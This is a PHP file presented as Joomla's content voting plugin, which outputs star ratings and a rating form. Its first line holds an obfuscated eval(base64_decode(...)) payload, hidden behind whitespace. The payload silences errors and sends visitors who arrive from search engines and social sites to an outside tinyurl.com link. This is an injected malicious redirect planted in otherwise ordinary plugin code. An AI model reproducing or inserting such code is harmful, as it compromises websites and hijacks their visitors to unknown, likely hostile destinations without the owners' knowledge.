<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id: vote.php 14401 2010-01-26 14:10:00Z louis $
* @package		Joomla
* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

$mainframe->registerEvent( 'onBeforeDisplayContent', 'plgContentVote' );

function plgContentVote( &$row, &$params, $page=0 )
{
	$uri = & JFactory::getURI();

	$id 	= $row->id;
	$html 	= '';

	if (isset($row->rating_count) && $params->get( 'show_vote' ) && !$params->get( 'popup' ))
	{
		JPlugin::loadLanguage( 'plg_content_vote' );
		$html .= '<form method="post" action="' . $uri->toString( ) . '">';
		$img = '';

		// look for images in template if available
		$starImageOn 	= JHTML::_('image.site',  'rating_star.png', '/images/M_images/' );
		$starImageOff 	= JHTML::_('image.site',  'rating_star_blank.png', '/images/M_images/' );

		for ($i=0; $i < $row->rating; $i++) {
			$img .= $starImageOn;
		}
		for ($i=$row->rating; $i < 5; $i++) {
			$img .= $starImageOff;
		}
		$html .= '<span class="content_rating">';
		$html .= JText::_( 'User Rating' ) .':'. $img .'&nbsp;/&nbsp;';
		$html .= intval( $row->rating_count );
		$html .= "</span>\n<br />\n";

		if (!$params->get( 'intro_only' ))
		{
			$html .= '<span class="content_vote">';
			$html .= JText::_( 'Poor' );
			$html .= '<input type="radio" alt="vote 1 star" name="user_rating" value="1" />';
			$html .= '<input type="radio" alt="vote 2 star" name="user_rating" value="2" />';
			$html .= '<input type="radio" alt="vote 3 star" name="user_rating" value="3" />';
			$html .= '<input type="radio" alt="vote 4 star" name="user_rating" value="4" />';
			$html .= '<input type="radio" alt="vote 5 star" name="user_rating" value="5" checked="checked" />';
			$html .= JText::_( 'Best' );
			$html .= '&nbsp;<input class="button" type="submit" name="submit_vote" value="'. JText::_( 'Rate' ) .'" />';
			$html .= '<input type="hidden" name="task" value="vote" />';
			$html .= '<input type="hidden" name="option" value="com_content" />';
			$html .= '<input type="hidden" name="cid" value="'. $id .'" />';
			$html .= '<input type="hidden" name="url" value="'.  $uri->toString( ) .'" />';
			$html .= '</span>';
		}
		$html .= '</form>';
	}
	return $html;
}